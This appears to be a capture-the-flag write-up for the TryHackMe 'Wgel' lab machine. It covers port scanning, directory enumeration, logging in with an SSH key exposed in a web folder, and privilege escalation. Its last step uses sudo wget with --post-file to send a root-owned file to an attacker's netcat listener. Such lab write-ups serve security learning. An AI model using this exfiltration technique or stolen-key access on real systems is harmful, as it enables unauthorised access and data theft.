<p align="center">
  <img width="120" height="120" src="images/thm_logo.png">
</p>

# 🏴‍☠️ THM - Wgel (CTF Write-up)

### 📌 Target Information
| Field       | Value            |
|------------|-----------------|
| **IP**     | `10.201.37.255` |
| **Open Ports** | `22 (SSH)` • `80 (HTTP)` |

### 🔍 Full Recon & Exploitation

```console
# Nmap Scan
sudo nmap 10.201.37.255 -sC -sV -sS
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-07 15:50 UTC
Nmap scan report for 10.201.37.255
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Web Enumeration
# Viewing page source revealed username: Jessie
gobuster dir -u http://10.201.37.255/sitemap/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
# Found Directories:
# /images/ /css/ /js/ /fonts/
# Hidden directory: /.ssh/

# SSH Key Exploitation
# Downloaded id_rsa from /.ssh/
chmod 600 id_rsa
ssh -i id_rsa jessie@10.201.37.255
# Gained shell as user 'jessie'

# User Flag Enumeration
cd ~/Documents
find / -type f -name "user*" 2>/dev/null
# Flag retrieved (hidden)

# Privilege Escalation & Root Flag
find / -type f -name "root*" 2>/dev/null
find / -type f -name "*.txt" 2>/dev/null
find /root -type f -name "flag*" 2>/dev/null
find /root -type f -name "root_flag*" 2>/dev/null
# Root flag located

# Exfiltrating Root Flag using Netcat
# On attacker machine:
nc -lvp 8989
# On victim machine:
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<YOUR-IP>:8989
# Root flag retrieved (hidden)
